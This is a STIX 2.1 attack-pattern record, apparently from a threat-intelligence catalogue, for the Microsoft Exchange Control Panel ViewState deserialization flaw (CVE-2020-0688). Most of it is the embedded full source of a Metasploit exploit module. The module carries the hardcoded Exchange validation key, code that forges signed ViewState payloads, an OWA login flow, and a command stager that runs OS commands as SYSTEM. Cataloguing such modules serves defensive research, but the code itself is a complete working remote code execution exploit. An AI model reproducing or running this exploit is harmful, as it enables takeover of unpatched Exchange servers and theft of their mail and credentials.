{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--349582cc-ac0e-4239-b180-18f26326a64e",
    "created": "2024-08-14T16:53:32.873648Z",
    "modified": "2024-08-14T16:53:32.873652Z",
    "name": "Exchange Control Panel ViewState Deserialization",
    "description": " This module exploits a .NET serialization vulnerability in the Exchange Control Panel (ECP) web page. The vulnerability is due to Microsoft Exchange Server not randomizing the keys on a per-installation basis resulting in them using the same validationKey and decryptionKey values. With knowledge of these values, an attacker can craft a special ViewState to cause an OS command to be executed by NT_AUTHORITY\\SYSTEM using .NET deserialization. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/exchange_ecp_viewstate.rb",
            "external_id": "exchange_ecp_viewstate.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-0688"
        },
        {
            "source_name": "reference",
            "url": "https://www.thezdi.com/blog/2020/2/24/cve-2020-0688-remote-code-execution-on-microsoft-exchange-server-through-fixed-cryptographic-keys"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'bindata'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  # include Msf::Auxiliary::Report\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n\n  DEFAULT_VIEWSTATE_GENERATOR = 'B97B4E27'\n  VALIDATION_KEY = \"\\xcb\\x27\\x21\\xab\\xda\\xf8\\xe9\\xdc\\x51\\x6d\\x62\\x1d\\x8b\\x8b\\xf1\\x3a\\x2c\\x9e\\x86\\x89\\xa2\\x53\\x03\\xbf\"\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Exchange Control Panel ViewState Deserialization',\n      'Description'    => %q{\n        This module exploits a .NET serialization vulnerability in the\n        Exchange Control Panel (ECP) web page. The vulnerability is due to\n        Microsoft Exchange Server not randomizing the keys on a\n        per-installation basis resulting in them using the same validationKey\n        and decryptionKey values. With knowledge of these values, an attacker\n        can craft a special ViewState to cause an OS command to be executed\n        by NT_AUTHORITY\\SYSTEM using .NET deserialization.\n      },\n      'Author'         => 'Spencer McIntyre',\n      'License'        => MSF_LICENSE,\n      'References'     => [\n          ['CVE', '2020-0688'],\n          ['URL', 'https://www.thezdi.com/blog/2020/2/24/cve-2020-0688-remote-code-execution-on-microsoft-exchange-server-through-fixed-cryptographic-keys'],\n      ],\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Windows (x86)', { 'Arch' => ARCH_X86 } ],\n          [ 'Windows (x64)', { 'Arch' => ARCH_X64 } ],\n          [ 'Windows (cmd)', { 'Arch' => ARCH_CMD, 'Space' => 450 } ]\n        ],\n      'DefaultOptions' =>\n        {\n          'SSL' => true\n        },\n      'DefaultTarget'  => 1,\n      'DisclosureDate' => '2020-02-11',\n      'Notes'          =>\n        {\n          'Stability'   => [ CRASH_SAFE, ],\n          'SideEffects' => [ ARTIFACTS_ON_DISK, IOC_IN_LOGS, ],\n          'Reliability' => [ REPEATABLE_SESSION, ],\n        },\n      'Privileged'      => true\n    ))\n\n    register_options([\n      Opt::RPORT(443),\n      OptString.new('TARGETURI', [ true, 'The base path to the web application', '/' ]),\n      OptString.new('USERNAME', [ true, 'Username to authenticate as', '' ]),\n      OptString.new('PASSWORD', [ true, 'The password to authenticate with' ]),\n      OptString.new('DOMAIN', [ false, 'The domain to use for authentication', '' ])\n    ])\n\n    register_advanced_options([\n      OptFloat.new('CMDSTAGER::DELAY', [ true, 'Delay between command executions', 0.5 ]),\n    ])\n  end\n\n  def check\n    state = get_request_setup\n    viewstate = state[:viewstate]\n    return CheckCode::Unknown if viewstate.nil?\n\n    viewstate = Rex::Text.decode_base64(viewstate)\n    body = viewstate[0...-20]\n    signature = viewstate[-20..-1]\n\n    unless generate_viewstate_signature(state[:viewstate_generator], state[:session_id], body) == signature\n      return CheckCode::Safe\n    end\n\n    # we've validated the signature matches based on the data we have and thus\n    # proven that we are capable of signing a viewstate ourselves\n    CheckCode::Vulnerable\n  end\n\n  def generate_viewstate(generator, session_id, cmd)\n    viewstate = ::Msf::Util::DotNetDeserialization.generate(\n      cmd,\n      gadget_chain: :TextFormattingRunProperties,\n      formatter: :LosFormatter\n    )\n    signature = generate_viewstate_signature(generator, session_id, viewstate)\n    Rex::Text.encode_base64(viewstate + signature)\n  end\n\n  def generate_viewstate_signature(generator, session_id, viewstate)\n    mac_key_bytes  = Rex::Text.hex_to_raw(generator).unpack('I<').pack('I>')\n    mac_key_bytes << Rex::Text.to_unicode(session_id)\n    OpenSSL::HMAC.digest(OpenSSL::Digest.new('sha1'), VALIDATION_KEY, viewstate + mac_key_bytes)\n  end\n\n  def exploit\n    state = get_request_setup\n\n    # the major limit is the max length of a GET request, the command will be\n    # XML escaped and then base64 encoded which both increase the size\n    if target.arch.first == ARCH_CMD\n      execute_command(payload.encoded, opts={state: state})\n    else\n      cmd_target = targets.select { |target| target.arch.include? ARCH_CMD }.first\n      execute_cmdstager({linemax: cmd_target.opts['Space'], delay: datastore['CMDSTAGER::DELAY'], state: state})\n    end\n  end\n\n  def execute_command(cmd, opts)\n    state = opts[:state]\n    viewstate = generate_viewstate(state[:viewstate_generator], state[:session_id], cmd)\n    5.times do |iteration|\n      # this request *must* be a GET request, can't use POST to use a larger viewstate\n      send_request_cgi({\n        'uri'      => normalize_uri(target_uri.path, 'ecp', 'default.aspx'),\n        'cookie'   => state[:cookies].join(''),\n        'agent'    => state[:user_agent],\n        'vars_get' => {\n          '__VIEWSTATE'          => viewstate,\n          '__VIEWSTATEGENERATOR' => state[:viewstate_generator]\n        }\n      })\n      break\n    rescue Rex::ConnectionError, Errno::ECONNRESET => e\n      vprint_warning('Encountered a connection error while sending the command, sleeping before retrying')\n      sleep iteration\n    end\n  end\n\n  def get_request_setup\n    # need to use a newer default user-agent than what Metasploit currently provides\n    # see: https://docs.microsoft.com/en-us/microsoft-edge/web-platform/user-agent-string\n    user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.74 Safari/537.36 Edg/79.0.309.43'\n    res = send_request_cgi({\n      'uri'           => normalize_uri(target_uri.path, 'owa', 'auth.owa'),\n      'method'        => 'POST',\n      'agent'         => user_agent,\n      'vars_post'     => {\n        'password'    => datastore['PASSWORD'],\n        'flags'       => '4',\n        'destination' => full_uri(normalize_uri(target_uri.path, 'owa'), vhost_uri: true),\n        'username'    => username\n      }\n    })\n    fail_with(Failure::Unreachable, 'The initial HTTP request to the server failed') if res.nil?\n    cookies = [res.get_cookies]\n\n    res = send_request_cgi({\n      'uri'    => normalize_uri(target_uri.path, 'ecp', 'default.aspx'),\n      'cookie' => res.get_cookies,\n      'agent'  => user_agent\n    })\n    fail_with(Failure::UnexpectedReply, 'Failed to get the __VIEWSTATEGENERATOR page') unless res && res.code == 200\n    cookies << res.get_cookies\n\n    viewstate_generator = res.body.scan(/id=\"__VIEWSTATEGENERATOR\"\\s+value=\"([a-fA-F0-9]{8})\"/).flatten[0]\n    if viewstate_generator.nil?\n      print_warning(\"Failed to find the __VIEWSTATEGENERATOR, using the default value: #{DEFAULT_VIEWSTATE_GENERATOR}\")\n      viewstate_generator = DEFAULT_VIEWSTATE_GENERATOR\n    else\n      vprint_status(\"Recovered the __VIEWSTATEGENERATOR: #{viewstate_generator}\")\n    end\n\n    viewstate = res.body.scan(/id=\"__VIEWSTATE\"\\s+value=\"([a-zA-Z0-9\\+\\/]+={0,2})\"/).flatten[0]\n    if viewstate.nil?\n      vprint_warning('Failed to find the __VIEWSTATE value')\n    end\n\n    session_id = res.get_cookies.scan(/ASP\\.NET_SessionId=([\\w\\-]+);/).flatten[0]\n    if session_id.nil?\n      fail_with(Failure::UnexpectedReply, 'Failed to get the ASP.NET_SessionId from the response cookies')\n    end\n    vprint_status(\"Recovered the ASP.NET_SessionID: #{session_id}\")\n\n    {user_agent: user_agent, cookies: cookies, viewstate: viewstate, viewstate_generator: viewstate_generator, session_id: session_id}\n  end\n\n  def username\n    if datastore['DOMAIN'].blank?\n      datastore['USERNAME']\n    else\n      [ datastore['DOMAIN'], datastore['USERNAME'] ].join('\\\\')\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2020-02-11",
    "x_mitre_platforms": [
        "win'"
    ]
}